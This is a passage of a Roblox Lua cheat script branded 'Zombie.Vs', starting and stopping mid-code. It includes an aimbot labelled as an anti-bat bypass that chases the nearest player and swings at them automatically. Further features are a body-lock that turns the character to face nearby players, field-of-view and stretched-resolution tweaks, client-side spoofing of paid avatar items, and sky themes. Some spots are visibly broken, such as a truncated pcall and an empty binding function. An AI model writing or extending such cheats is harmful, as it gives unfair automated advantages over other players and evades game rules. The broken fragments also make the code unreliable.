    if math.abs(res.Normal.Y) > _G.AcePathfind.cfg.WALL_Y then return false end
    return true
end
function _G.AcePathfind.steer(origin, dir, dist)
    if dir.Magnitude < 0.01 then return dir end
    dir = dir.Unit
    local C = _G.AcePathfind.cfg
    dist = dist or C.PROBE
    local params = _G.AcePathfind.rayParams()
    local low = origin - Vector3.new(0, 2, 0)
    if not _G.AcePathfind.blocked(origin, dir, dist, params)
       and not _G.AcePathfind.blocked(low, dir, dist, params) then
        return dir
    end
    for _, deg in ipairs(C.ANGLES) do
        for _, sign in ipairs({1, -1}) do
            local rot = CFrame.Angles(0, math.rad(deg * sign), 0)
            local cand = rot:VectorToWorldSpace(dir)
            cand = Vector3.new(cand.X, 0, cand.Z)
            if cand.Magnitude > 0.01 then
                cand = cand.Unit
                if not _G.AcePathfind.blocked(origin, cand, dist, params)
                   and not _G.AcePathfind.blocked(low, cand, dist, params) then
                    return cand
                end
            end
        end
    end
    return dir
end
_G.AcePathfind.paths = _G.AcePathfind.paths or {}
function _G.AcePathfind.reset(key) _G.AcePathfind.paths[key] = nil end
function _G.AcePathfind.dirTo(key, from, goal, opts)
    local C = _G.AcePathfind.cfg
    local st = _G.AcePathfind.paths[key]
    local now = os.clock()
    local recompute = (opts and tonumber(opts.recompute)) or C.RECOMPUTE
    local drift     = (opts and tonumber(opts.drift))     or C.GOAL_DRIFT
    if st and st.goal and (st.goal - goal).Magnitude > drift then st = nil end
    if not st then
        st = {goal = goal, wp = nil, i = 1, computing = false, last = 0}
        _G.AcePathfind.paths[key] = st
    end
    if not st.computing and (not st.wp or (now - st.last) > recompute) then
        st.computing = true
        st.last = now
        st.goal = goal
        local origin = from
        }; ok = __m[1]; path = __m[2]; end
            local cur = _G.AcePathfind.paths[key]
            if cur ~= st then return end
            st.computing = false
            if ok and path and path.Status == Enum.PathStatus.Success then
                local pts = path:GetWaypoints()
                st.wp = pts
                st.i = math.min(2, #pts)
            else
                st.wp = nil
            end
        end)
    end
    local wp = st.wp
    if not wp or #wp == 0 then return nil end
    while st.i <= #wp do
        local pt = wp[st.i].Position
        local d = Vector3.new(pt.X - from.X, 0, pt.Z - from.Z)
        if d.Magnitude > C.WP_REACH then
            if d.Magnitude < 0.01 then return nil end
            return d.Unit
        end
        st.i = st.i + 1
    end
    return nil
end
end
function F.startAimbotBypassAntiBat() pcall(function() if tpBatEnabled and stopTPBat then stopTPBat() end end) pcall(function() if aimbotEnabled and stopAimbot then stopAimbot() end end) pcall(function() if S.autoBatEnabled and S.disableAutoBat then S.disableAutoBat() end end) if AceAntiBypassAimbot.conn then pcall(function() AceAntiBypassAimbot.conn:Disconnect() end) AceAntiBypassAimbot.conn = nil end antiBatBypassLockEnabled = true; S.antiBatBypassEnabled = true; local hum0 = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid") if hum0 then
AceAntiBypassAimbot.prevAutoRotate = hum0.AutoRotate; hum0.AutoRotate = false end pcall(function() F.destroyProxy() end) local bypassTick = 0; local _bpTarget, _bpDist, _bpLastScan = nil, math.huge, 0 AceAntiBypassAimbot.conn = RunService.Heartbeat:Connect(function() if not antiBatBypassLockEnabled then return end bypassTick = bypassTick + 1 if bypassTick % (_IS_MOBILE and 3 or 8) == 0 then return end local char = LP.Character if not char then return end local root = char:FindFirstChild("HumanoidRootPart"); local hum = char:FindFirstChildOfClass("Humanoid")
if not root or not hum then return end if bypassTick % 5 == 0 then local bat = AntiBypassFindBat() if bat and bat.Parent ~= char then pcall(function() hum:EquipTool(bat) end) end end local now = os.clock() if (now - _bpLastScan) >= (_IS_MOBILE and 0.08 or 0.03) then _bpLastScan = now; do local __m = {AntiBypassGetClosest()}; _bpTarget = __m[1]; _bpDist = __m[2]; end end local target, targetDist = _bpTarget, _bpDist if not target then return end local myPos = root.Position; local targetPos = target.Position; local direction = targetPos - myPos; local flatDir = Vector3.new(direction.X, 0, direction.Z) if flatDir.Magnitude > 0 then
flatDir = flatDir.Unit else flatDir = Vector3.zero end if _G.AcePathfind and flatDir.Magnitude > 0 then local pd = _G.AcePathfind.dirTo("aimbot", myPos, targetPos, {recompute=0.35, drift=4}) if pd then flatDir = pd end flatDir = _G.AcePathfind.steer(myPos, flatDir, _G.AcePathfind.cfg.PROBE) end local chaseSpeed = GetAntiBypassAimbotSpeed(); local desiredHeight = targetPos.Y; local yVel = (desiredHeight - myPos.Y) * 19.5 yVel = math.clamp(yVel, -70, 110); local desiredVel = Vector3.new(flatDir.X * chaseSpeed, yVel, flatDir.Z * chaseSpeed); root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(desiredVel, 0.8); local toTarget = targetPos - myPos if toTarget.Magnitude > 0.1 then
local goalCF = CFrame.lookAt(myPos, targetPos); local diffCF = root.CFrame:Inverse() * goalCF; local rx, ry, rz; do local __m = {diffCF:ToEulerAnglesXYZ()}; rx = __m[1]; ry = __m[2]; rz = __m[3]; end; rx = math.clamp(rx, -2.5, 2.5); ry = math.clamp(ry, -2.5, 2.5); rz = math.clamp(rz, -2.5, 2.5); root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(Vector3.new(rx * 42, ry * 42, rz * 42)) end AntiBypassTrySwing() end) if VS and VS.setAntiBatBypassVisual then pcall(function() VS.setAntiBatBypassVisual(true) end) end end function F.stopAimbotBypassAntiBat()
antiBatBypassLockEnabled = false; S.antiBatBypassEnabled = false if AceAntiBypassAimbot.conn then pcall(function() AceAntiBypassAimbot.conn:Disconnect() end) AceAntiBypassAimbot.conn = nil end AceAntiBypassAimbot.swingCooldown = false; if _G.AcePathfind then pcall(_G.AcePathfind.reset, "aimbot") end local c = LP.Character; local root = c and c:FindFirstChild("HumanoidRootPart") if root then pcall(function() root.AssemblyAngularVelocity = Vector3.zero end) end local hum = c and c:FindFirstChildOfClass("Humanoid") if hum then local prev = AceAntiBypassAimbot.prevAutoRotate; hum.AutoRotate = (prev == nil) and true or prev end
AceAntiBypassAimbot.prevAutoRotate = nil if VS and VS.setAntiBatBypassVisual then pcall(function() VS.setAntiBatBypassVisual(false) end) end end end cursedInstaReset = nil   K7 = { fovEnabled = false, fovValue = 80, lineESPEnabled = false, speedESPEnabled = false, animPackEnabled = false, animPackName = "Tryhard", animPackIndex = 1, headlessEnabled = false, korbloxEnabled = false, bodyLockEnabled = false, bodyLockRadius = 60, medusaResetEnabled = false, currentSkyTheme = "Off", skyThemeIndex = 1, } K7.headIndicator = nil K7.headSpeedConn = nil function K7.updateHeadIndicatorTheme()
local indicator = K7.headIndicator if not indicator then return end local accent = S.themeColor or Color3.fromRGB(245, 245, 247) if indicator.discord then indicator.discord.TextColor3 = accent end if indicator.speed then indicator.speed.TextColor3 = accent end if indicator.divider then indicator.divider.BackgroundColor3 = accent end end function K7.setupHeadIndicator(char) char = char or LP.Character; local head = char and (char:FindFirstChild("Head") or char:WaitForChild("Head", 5)) if not head then return end local old = head:FindFirstChild("ZombieVSHeadIndicator")
if old then old:Destroy() end
local bb = Instance.new("BillboardGui"); bb.Name = "ZombieVSHeadIndicator"; bb.Size = UDim2.new(0, 250, 0, 90); bb.StudsOffset = Vector3.new(0, 3.5, 0); bb.AlwaysOnTop = true; bb.MaxDistance = 600; bb.Adornee = head; bb.Parent = head; local accent = S.themeColor or Color3.fromRGB(245, 245, 247); local discordLbl = Instance.new("TextLabel"); discordLbl.Name = "Discord"; discordLbl.Size = UDim2.new(1, 0, 0.30, 0); discordLbl.Position = UDim2.new(0, 0, 0.30, 0); discordLbl.BackgroundTransparency = 1; discordLbl.Text = "Zombie.Vs"; discordLbl.TextColor3 = accent; discordLbl.Font = Enum.Font.GothamBold; discordLbl.TextScaled = true; discordLbl.TextStrokeTransparency = 0; discordLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0); discordLbl.Parent = bb; local divider = Instance.new("Frame"); divider.Name = "Divider"; divider.Size = UDim2.new(0.72, 0, 0, 2); divider.Position = UDim2.new(0.14, 0, 0.635, 0); divider.BackgroundColor3 = accent; divider.BackgroundTransparency = 0.15; divider.BorderSizePixel = 0; divider.ZIndex = 2; divider.Parent = bb; local dividerCorner = Instance.new("UICorner"); dividerCorner.CornerRadius = UDim.new(1, 0); dividerCorner.Parent = divider; local speedLbl = Instance.new("TextLabel"); speedLbl.Name = "Speed"; speedLbl.Size = UDim2.new(1, 0, 0.30, 0); speedLbl.Position = UDim2.new(0, 0, 0.66, 0); speedLbl.BackgroundTransparency = 1; speedLbl.Text = "0.0"; speedLbl.TextColor3 = accent; speedLbl.Font = Enum.Font.GothamBold; speedLbl.TextScaled = true; speedLbl.TextStrokeTransparency = 0; speedLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0); speedLbl.Parent = bb; K7.headIndicator = { bb = bb, discord = discordLbl, speed = speedLbl, divider = divider }; K7.updateHeadIndicatorTheme()
end function K7.startHeadSpeedUpdates() if K7.headSpeedConn then K7.headSpeedConn:Disconnect() end K7.headSpeedConn = RunService.Heartbeat:Connect(function() local indicator = K7.headIndicator if not indicator or not indicator.bb or not indicator.bb.Parent then return end local char = LP.Character; local hrp = char and char:FindFirstChild("HumanoidRootPart"); local displaySpeed = 0 if S and (S.autoLeftEnabled or S.autoRightEnabled) then local ok, value; do local __m = {pcall(function() return (F and F.getAutoPathSpeed and F.getAutoPathSpeed()) or nil end)}; ok = __m[1]; value = __m[2]; end if ok and type(value) == "number" then
displaySpeed = value elseif F and F.getActiveMoveSpeed then local ok2, v2; do local __m = {pcall(F.getActiveMoveSpeed)}; ok2 = __m[1]; v2 = __m[2]; end if ok2 and type(v2) == "number" then displaySpeed = v2 end end elseif F and F.getActiveMoveSpeed then local ok, value; do local __m = {pcall(F.getActiveMoveSpeed)}; ok = __m[1]; value = __m[2]; end if ok and type(value) == "number" then displaySpeed = value end elseif hrp then local velocity = hrp.AssemblyLinearVelocity; displaySpeed = Vector3.new(velocity.X, 0, velocity.Z).Magnitude end indicator.speed.Text = string.format("%.1f", displaySpeed) end) end  function bindHeadIndicator(char)  end bindHeadIndicator(LP.Character); LP.CharacterAdded:Connect(bindHeadIndicator) do local skyThemeTag = "CursedSkyTheme"; local currentSkyTheme = "Off"; local SkyOrder = {"Off","Night","Aurora","Sunset","Galaxy","Cyber","Sakura","Pink Night","Blood Moon","Emerald Dawn","Volcanic","Arctic","Midnight Ocean","Vaporwave","Toxic","Solar Eclipse","Hellscape","Heaven","Storm","Sunrise","Deep Space","Lavender Dream","Inferno","Mint Sky"} local SkyPresets = { ["Off"]={kind="off"},
["Night"]={clock=22,brightness=2,ambient={110,100,130},outAmb={120,110,140},sky={stars=4000,moon=18,sun=0,moonTex=true},atm={dens=0.45,color={120,60,180},decay={60,20,100},glare=0.5,haze=1.2}}, ["Aurora"]={clock=14,brightness=3,ambient={150,120,150},outAmb={160,130,150},atm={dens=0.55,color={255,80,200},decay={255,20,150},glare=2.5,haze=3},clouds={cover=0.7,dens=0.7,color={255,240,250}}},
["Sunset"]={clock=17.2,brightness=2.5,ambient={170,120,100},outAmb={180,130,110},sky={stars=0,sun=25,moon=0},atm={dens=0.5,color={255,130,60},decay={255,80,30},glare=2,haze=2.5},clouds={cover=0.55,dens=0.55,color={255,200,140}}}, ["Galaxy"]={clock=0,brightness=1.5,ambient={70,60,100},outAmb={80,70,110},sky={stars=10000,moon=30,sun=0},atm={dens=0.15,color={40,20,80},decay={20,10,50},glare=0.3,haze=0.5}},
["Cyber"]={clock=21,brightness=2.2,ambient={90,130,170},outAmb={100,140,180},sky={stars=2000,moon=12},atm={dens=0.4,color={0,200,255},decay={150,0,255},glare=2,haze=2},clouds={cover=0.4,dens=0.6,color={100,200,255}}}, ["Sakura"]={clock=11,brightness=3.5,ambient={170,150,160},outAmb={180,160,170},sky={sun=8},atm={dens=0.3,color={255,200,220},decay={255,170,200},glare=1,haze=1.5},clouds={cover=0.6,dens=0.4,color={255,250,252}}},
["Pink Night"]={clock=23,brightness=2.2,ambient={120,60,110},outAmb={140,70,120},sky={stars=5000,moon=22,sun=0,moonTex=true},atm={dens=0.5,color={255,80,180},decay={140,30,100},glare=0.7,haze=1.4}}, ["Blood Moon"]={clock=22.5,brightness=1.6,ambient={130,40,40},outAmb={150,50,50},sky={stars=1500,moon=28,sun=0,moonTex=true},atm={dens=0.6,color={220,30,30},decay={120,10,10},glare=1.4,haze=2}}, ["Emerald Dawn"]={clock=6.5,brightness=2.8,ambient={130,170,140},outAmb={140,180,150},sky={sun=18},atm={dens=0.4,color={80,200,140},decay={40,150,90},glare=1.8,haze=2.2}},
["Volcanic"]={clock=19,brightness=2,ambient={180,80,40},outAmb={200,90,50},sky={stars=200,sun=12},atm={dens=0.75,color={255,60,0},decay={180,20,0},glare=3,haze=3.5}}, ["Arctic"]={clock=9,brightness=3.2,ambient={200,220,235},outAmb={210,230,245},sky={sun=10},atm={dens=0.3,color={180,220,255},decay={140,200,240},glare=1.5,haze=1.8}}, ["Midnight Ocean"]={clock=1.5,brightness=1.7,ambient={60,90,130},outAmb={70,100,140},sky={stars=6000,moon=24,sun=0,moonTex=true},atm={dens=0.5,color={20,60,140},decay={10,30,90},glare=0.6,haze=1.5}},
["Vaporwave"]={clock=19.5,brightness=2.4,ambient={180,120,200},outAmb={190,130,210},sky={stars=1000,moon=14},atm={dens=0.45,color={255,100,220},decay={120,60,255},glare=2.2,haze=2.4}}, ["Toxic"]={clock=13,brightness=2.5,ambient={140,180,80},outAmb={150,190,90},atm={dens=0.55,color={100,220,40},decay={60,150,20},glare=1.8,haze=2.6}}, ["Solar Eclipse"]={clock=12,brightness=0.9,ambient={50,40,60},outAmb={60,50,70},sky={stars=3500,sun=22},atm={dens=0.5,color={255,140,40},decay={30,20,40},glare=2.8,haze=1.8}},
["Hellscape"]={clock=18,brightness=1.8,ambient={200,60,30},outAmb={220,70,40},sky={stars=100,sun=30},atm={dens=0.85,color={255,30,0},decay={120,0,0},glare=3.5,haze=4}}, ["Heaven"]={clock=12,brightness=4,ambient={240,235,210},outAmb={250,245,220},sky={sun=16},atm={dens=0.25,color={255,250,220},decay={255,240,200},glare=3,haze=1.5}}, ["Storm"]={clock=15,brightness=1.4,ambient={90,90,110},outAmb={100,100,120},sky={sun=6},atm={dens=0.65,color={80,90,120},decay={40,50,80},glare=0.5,haze=3}},
["Sunrise"]={clock=6.2,brightness=2.8,ambient={220,180,130},outAmb={230,190,140},sky={sun=22},atm={dens=0.45,color={255,180,100},decay={255,140,80},glare=2.4,haze=2.2}}, ["Deep Space"]={clock=0,brightness=1,ambient={30,25,50},outAmb={40,35,60},sky={stars=15000,moon=0,sun=0},atm={dens=0.08,color={15,5,40},decay={5,0,20},glare=0.2,haze=0.3}}, ["Lavender Dream"]={clock=18.5,brightness=2.6,ambient={180,160,220},outAmb={190,170,230},sky={stars=800,moon=16},atm={dens=0.4,color={200,160,255},decay={160,120,220},glare=1.4,haze=1.8}},
["Inferno"]={clock=17.5,brightness=2.2,ambient={220,100,40},outAmb={235,110,50},sky={sun=26},atm={dens=0.6,color={255,90,20},decay={200,40,0},glare=3,haze=3.2}}, ["Mint Sky"]={clock=10,brightness=3.2,ambient={180,230,210},outAmb={190,240,220},sky={sun=10},atm={dens=0.32,color={150,255,210},decay={100,220,180},glare=1.6,haze=1.6}}, } local function skyRGB(t) return Color3.fromRGB(t[1],t[2],t[3]) end local function applySkyTheme(mode) currentSkyTheme = mode or "Off"; K7.currentSkyTheme = currentSkyTheme for _,child in ipairs(Lighting:GetChildren()) do
if child:GetAttribute(skyThemeTag) then pcall(function() child:Destroy() end) end end local terrain = workspace:FindFirstChildOfClass("Terrain") if terrain then for _,child in ipairs(terrain:GetChildren()) do if child:GetAttribute(skyThemeTag) then pcall(function() child:Destroy() end) end end end local preset = SkyPresets[mode] if not preset or preset.kind == "off" then Lighting.ClockTime = 14; Lighting.Brightness = 2; Lighting.OutdoorAmbient = Color3.fromRGB(127,127,127); Lighting.Ambient = Color3.fromRGB(127,127,127); Lighting.FogEnd = 100000; Lighting.GlobalShadows = true return end
Lighting.FogStart = 0; Lighting.FogEnd = 100000; Lighting.GlobalShadows = true; Lighting.ClockTime = preset.clock or 14; Lighting.Brightness = preset.brightness or 2 if preset.outAmb then Lighting.OutdoorAmbient = skyRGB(preset.outAmb) end if preset.ambient then Lighting.Ambient = skyRGB(preset.ambient) end if preset.sky then local skyInst = Instance.new("Sky"); skyInst:SetAttribute(skyThemeTag, true) if preset.sky.stars then skyInst.StarCount = preset.sky.stars end if preset.sky.moon then skyInst.MoonAngularSize = preset.sky.moon end
if preset.sky.sun then skyInst.SunAngularSize = preset.sky.sun end if preset.sky.moonTex then skyInst.MoonTextureId = "rbxasset://sky/moon.jpg" end skyInst.Parent = Lighting end if preset.atm then local atm = Instance.new("Atmosphere"); atm:SetAttribute(skyThemeTag, true); atm.Density = preset.atm.dens or 0.3; atm.Color = skyRGB(preset.atm.color); atm.Decay = skyRGB(preset.atm.decay); atm.Glare = preset.atm.glare or 1; atm.Haze = preset.atm.haze or 1; atm.Parent = Lighting end if preset.clouds and terrain then
local clouds = Instance.new("Clouds"); clouds:SetAttribute(skyThemeTag, true); clouds.Cover = preset.clouds.cover or 0.5; clouds.Density = preset.clouds.dens or 0.5; clouds.Color = skyRGB(preset.clouds.color); clouds.Parent = terrain end end local skyThemeIndex = 1 local function cycleSkyTheme(dir) skyThemeIndex = skyThemeIndex + (dir or 1) if skyThemeIndex < 1 then skyThemeIndex = #SkyOrder end if skyThemeIndex > #SkyOrder then skyThemeIndex = 1 end applySkyTheme(SkyOrder[skyThemeIndex]); K7.skyThemeIndex = skyThemeIndex return SkyOrder[skyThemeIndex] end
_G._VezyFOV = _G._VezyFOV or 70; local fovEnabled = false; local fovValue = 70; local fovConn = nil; local stretchRezEnabled = false; local stretchRezConn, stretchFovConn = nil, nil; local stretchFOV = 120; _G.State = _G.State or {}; State = _G.State; State.stretchedResEnabled = false; State.stretchFOV = 120 local function applyStretchFOV(val) local cam = workspace.CurrentCamera if cam then pcall(function() cam.FieldOfView = val end) end end local function enableStretchRez() S.stretchRezEnabled = true; State.stretchedResEnabled = true; local cam = workspace.CurrentCamera
if not cam then return end if S.stretchRezConn then S.stretchRezConn:Disconnect() end if stretchFovConn then stretchFovConn:Disconnect() end stretchFovConn = RunService.Heartbeat:Connect(function() if not S.stretchRezEnabled then return end if not _perfEveryN(4, 2) then return end applyStretchFOV(State.stretchFOV or stretchFOV) end) S.stretchRezConn = RunService.Heartbeat:Connect(function() if not S.stretchRezEnabled then if S.stretchRezConn then S.stretchRezConn:Disconnect(); S.stretchRezConn = nil end return end if _IS_MOBILE and not _perfEveryN(2, 1) then return end if cam then
cam.CFrame = cam.CFrame * CFrame.new(0, 0, 0, 1, 0, 0, 0, 0.7, 0, 0, 0, 1) end end) end local function disableStretchRez() S.stretchRezEnabled = false; State.stretchedResEnabled = false if S.stretchRezConn then S.stretchRezConn:Disconnect(); S.stretchRezConn = nil end if stretchFovConn then stretchFovConn:Disconnect(); stretchFovConn = nil end pcall(function() if workspace.CurrentCamera then workspace.CurrentCamera.FieldOfView = _G._VezyFOV or 70 end end) end local function applyFOV() pcall(function() RunService:UnbindFromRenderStep("CursedFOV") end)
if fovConn then fovConn:Disconnect(); fovConn = nil end if not K7.fovEnabled then local target = _G._VezyFOV or 70 if workspace.CurrentCamera and not State.stretchedResEnabled then workspace.CurrentCamera.FieldOfView = target end return end local cam = workspace.CurrentCamera; local target = K7.fovValue or _G._VezyFOV or 70; _G._VezyFOV = target if cam and not State.stretchedResEnabled then cam.FieldOfView = target end pcall(function() RunService:BindToRenderStep("CursedFOV", Enum.RenderPriority.Camera.Value + 1, function() if not K7.fovEnabled then return end
if State.stretchedResEnabled then return end local c = workspace.CurrentCamera if c then c.FieldOfView = K7.fovValue or _G._VezyFOV or 70 end end) end) fovConn = RunService.Heartbeat:Connect(function() if not _perfEveryN(3, 1) then return end if not K7.fovEnabled then return end if State.stretchedResEnabled then return end local c = workspace.CurrentCamera if c then c.FieldOfView = K7.fovValue or _G._VezyFOV or 70 end end) end do local _VezyFOVPropConn = nil local function _attachFOVLock(cam) if not cam then return end
if _VezyFOVPropConn then pcall(function() _VezyFOVPropConn:Disconnect() end) end pcall(function() if not State.stretchedResEnabled then cam.FieldOfView = _G._VezyFOV or 70 end end) _VezyFOVPropConn = cam:GetPropertyChangedSignal("FieldOfView"):Connect(function() local target = _G._VezyFOV or 70 if not State.stretchedResEnabled and cam.FieldOfView ~= target then pcall(function() cam.FieldOfView = target end) end end) end pcall(function() if workspace.CurrentCamera then _attachFOVLock(workspace.CurrentCamera) end workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function() task.wait()
pcall(function() _attachFOVLock(workspace.CurrentCamera) end) end) if LP then LP.CharacterAdded:Connect(function() task.wait(0.3) pcall(function() _attachFOVLock(workspace.CurrentCamera) end) end) end end) end local headlessEnabled, korbloxEnabled = false, false; local HEADLESS_MESH_ID = "rbxassetid://1095708" local function applyHeadless(char, enabled) if not char then return end local head = char:FindFirstChild("Head") if not head then return end if enabled then head.Transparency = 1; head.CanCollide = false; local face = head:FindFirstChild("face") if face then face:Destroy() end
for _, c in ipairs(head:GetChildren()) do if c:IsA("SpecialMesh") and c.Name == "HeadlessMesh" then c:Destroy() end end local mesh = Instance.new("SpecialMesh"); mesh.MeshType = Enum.MeshType.FileMesh; mesh.MeshId = HEADLESS_MESH_ID; mesh.Scale = Vector3.new(0.001, 0.001, 0.001); mesh.Name = "HeadlessMesh"; mesh.Parent = head else head.Transparency = 0; head.CanCollide = true for _, c in ipairs(head:GetChildren()) do if c:IsA("SpecialMesh") and c.Name == "HeadlessMesh" then c:Destroy() end end end end local KORBLOX_ASSETS = { ["Left Leg"] = { id = "rbxassetid://139607673",
targetBodyPart = "LeftUpperLeg", partsToHide = {"LeftUpperLeg", "LeftLowerLeg", "LeftFoot", "Left Leg"}, scale = Vector3.new(1, 1, 1), offset = CFrame.new(), }, ["Right Leg"] = { id = "rbxassetid://139607718", targetBodyPart = "RightUpperLeg", partsToHide = {"RightUpperLeg", "RightLowerLeg", "RightFoot", "Right Leg"}, scale = Vector3.new(1, 1, 1), offset = CFrame.new(), }, } local korbloxSide = 1 local function clearKorbloxAttachments(char) if not char then return end for _, name in ipairs({"Korblox_LeftLeg", "Korblox_RightLeg", "Korblox_Left Leg", "Korblox_Right Leg"}) do
local old = char:FindFirstChild(name) if old then pcall(function() old:Destroy() end) end end for _, child in ipairs(char:GetChildren()) do if child.Name:find("^Korblox_") then pcall(function() child:Destroy() end) end end for _, partName in ipairs({ "LeftUpperLeg", "LeftLowerLeg", "LeftFoot", "Left Leg", "RightUpperLeg", "RightLowerLeg", "RightFoot", "Right Leg", }) do local limb = char:FindFirstChild(partName) if limb and limb:IsA("BasePart") then limb.Transparency = 0 end end end local function attachKorbloxMesh(char, itemName, config) if not char then return false, "No character" end
local targetPart = char:FindFirstChild(config.targetBodyPart) if not targetPart then if itemName == "Left Leg" then targetPart = char:FindFirstChild("Left Leg") elseif itemName == "Right Leg" then targetPart = char:FindFirstChild("Right Leg") end end if not targetPart then return false, "Target part missing" end local safeName = "Korblox_" .. itemName:gsub("%s+", ""); local oldAsset = char:FindFirstChild(safeName) if oldAsset then pcall(function() oldAsset:Destroy() end) end for _, partName in ipairs(config.partsToHide) do local limb = char:FindFirstChild(partName)
if limb and limb:IsA("BasePart") then limb.Transparency = 1 end end local success, objects; do local __m = {pcall(function() return game:GetObjects(config.id) end)}; success = __m[1]; objects = __m[2]; end if not success or not objects or #objects == 0 then return false, "Asset fetch failed" end local assetModel = objects[1]; assetModel.Name = safeName; local mainMesh = assetModel:IsA("BasePart") and assetModel or assetModel:FindFirstChildWhichIsA("BasePart", true) if not mainMesh then return false, "No MeshPart in asset" end pcall(function() mainMesh.Size = mainMesh.Size * (config.scale or Vector3.new(1,1,1))
mainMesh.CanCollide = false; mainMesh.Anchored = false; mainMesh.CFrame = targetPart.CFrame * (config.offset or CFrame.new()) end) local weld = Instance.new("WeldConstraint") weld.Part0 = targetPart; weld.Part1 = mainMesh; weld.Parent = mainMesh; assetModel.Parent = char return true end local function applyKorblox(char, enabled) if not char then return end clearKorbloxAttachments(char) if not enabled then return end local sides = {}; local side = korbloxSide or 1 if side == 2 then sides = {"Left Leg"} elseif side == 3 then sides = {"Left Leg", "Right Leg"} else sides = {"Right Leg"} end
for _, itemName in ipairs(sides) do local config = KORBLOX_ASSETS[itemName] if config then local ok, err; do local __m = {attachKorbloxMesh(char, itemName, config)}; ok = __m[1]; err = __m[2]; end if not ok then warn("[Zombie.Vs] Korblox equip failed (" .. itemName .. "): " .. tostring(err)) end end end end local bodyLockEnabled = false; local bodyLockRadius = 60; local bodyLockConn = nil local function getNearestBodyLockTarget() local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") if not root then return nil end local nearest, shortest = nil, math.huge for _, plr in ipairs(Players:GetPlayers()) do
if plr ~= LP and plr.Character then local tr = plr.Character:FindFirstChild("HumanoidRootPart"); local hum = plr.Character:FindFirstChildOfClass("Humanoid") if tr and hum and hum.Health > 0 then local d = (tr.Position - root.Position).Magnitude if d <= (K7.bodyLockRadius or bodyLockRadius or 60) and d < shortest then shortest = d; nearest = plr end end end end return nearest end local function isNearBrainrot(root, radius) if not root then return false end radius = radius or 5 local ok, parts; do local __m = {pcall(function() return workspace:GetPartBoundsInRadius(root.Position, radius) end)}; ok = __m[1]; parts = __m[2]; end
if not ok or not parts then return false end for _, p in ipairs(parts) do if p and p:IsA("BasePart") then local model = p:FindFirstAncestorOfClass("Model") if model and model ~= LP.Character then if not Players:GetPlayerFromCharacter(model) then local n = string.lower(model.Name) if n:find("brainrot", 1, true) or n:find("animal", 1, true) or n:find("steal", 1, true) then return true end local par = model.Parent if par then local pn = string.lower(par.Name) if pn:find("brainrot", 1, true) or pn:find("animals", 1, true) then return true end end end end end end return false end
local function startBodyLock() if bodyLockConn then K7.bodyLockEnabled = true; bodyLockEnabled = true; S._bodyLockWanted = true return end K7.bodyLockEnabled = true; bodyLockEnabled = true; S._bodyLockWanted = true; S._bodyLockPausedByBrainrot = false; local _blCachedTarget = nil; local _blLastScan = 0; local _blLastBrain = 0; local _blNearBrain = false bodyLockConn = RunService.Heartbeat:Connect(function() if not K7.bodyLockEnabled then return end if aimbotEnabled or tpBatEnabled or antiBatBypassLockEnabled then return end
local char = LP.Character; local myRoot = char and char:FindFirstChild("HumanoidRootPart"); local humanoid = char and char:FindFirstChildOfClass("Humanoid") if not myRoot or not humanoid or humanoid.Health <= 0 then return end local now = os.clock(); local brainInterval = _IS_MOBILE and 0.18 or 0.08 if (now - _blLastBrain) >= brainInterval then _blLastBrain = now; local holding, near = false, false pcall(function() holding = F.isCarryingBrainrot and F.isCarryingBrainrot(char) == true end) pcall(function() near = isNearBrainrot and isNearBrainrot(myRoot, 5) == true end)
_blNearBrain = holding or near end if _blNearBrain then S._bodyLockPausedByBrainrot = true; humanoid.AutoRotate = true return end local scanInterval = _IS_MOBILE and 0.12 or 0.05 if (now - _blLastScan) >= scanInterval then _blLastScan = now; _blCachedTarget = getNearestBodyLockTarget() end local target = _blCachedTarget if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then local targetPos = target.Character.HumanoidRootPart.Position; local myPos = myRoot.Position; local offset = Vector3.new(targetPos.X, myPos.Y, targetPos.Z) - myPos
if offset.Magnitude > 0.1 then humanoid.AutoRotate = false; local lookDir = offset.Unit local currentDir = myRoot.CFrame.LookVector local cross = currentDir:Cross(lookDir); local currentVel = myRoot.AssemblyAngularVelocity; myRoot.AssemblyAngularVelocity = Vector3.new(currentVel.X, cross.Y * 40, currentVel.Z) end else humanoid.AutoRotate = true end end) end local function stopBodyLock(fromUser) K7.bodyLockEnabled = false; bodyLockEnabled = false if bodyLockConn then bodyLockConn:Disconnect(); bodyLockConn = nil end local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
if hum then hum.AutoRotate = true end if fromUser == true then S._bodyLockWanted = false; S._bodyLockPausedByBrainrot = false end end if not S._bodyLockBrainrotWatcher then S._bodyLockBrainrotWatcher = true RunService.Heartbeat:Connect(function() if not S._bodyLockWanted then return end if S._bodyLockPausedByCombat then return end if aimbotEnabled or tpBatEnabled then return end local char = LP.Character if not char then return end local root = char:FindFirstChild("HumanoidRootPart") if not root then return end local holding, near = false, false
pcall(function() holding = F.isCarryingBrainrot and F.isCarryingBrainrot(char) == true end) pcall(function() near = isNearBrainrot and isNearBrainrot(root, 5) == true end) if holding or near then S._bodyLockPausedByBrainrot = true return end if S._bodyLockPausedByBrainrot or not bodyLockConn then S._bodyLockPausedByBrainrot = false if not bodyLockConn then pcall(startBodyLock) else K7.bodyLockEnabled = true; bodyLockEnabled = true end if VS and VS.setBodyLockVisual then pcall(function() VS.setBodyLockVisual(true) end) end end end) end
local medusaResetEnabled = false; local medusaResetConns = {}; local medusaResetDebounce = false local function onPartAnchoredForReset(part) return part:GetPropertyChangedSignal("Anchored"):Connect(function() if part.Anchored and part.Transparency == 1 and part.Name ~= "HumanoidRootPart" then if medusaResetDebounce or not K7.medusaResetEnabled then return end medusaResetDebounce = true  end end) end local function startMedusaReset()
for _, c in pairs(medusaResetConns) do pcall(function() c:Disconnect() end) end medusaResetConns = {}; local char = LP.Character if not char then return end for _, part in ipairs(char:GetDescendants()) do if part:IsA("BasePart") then table.insert(medusaResetConns, onPartAnchoredForReset(part)) end end table.insert(medusaResetConns, char.DescendantAdded:Connect(function(part) if part:IsA("BasePart") then table.insert(medusaResetConns, onPartAnchoredForReset(part)) end end)) end local function stopMedusaReset() for _, c in pairs(medusaResetConns) do pcall(function() c:Disconnect() end) end
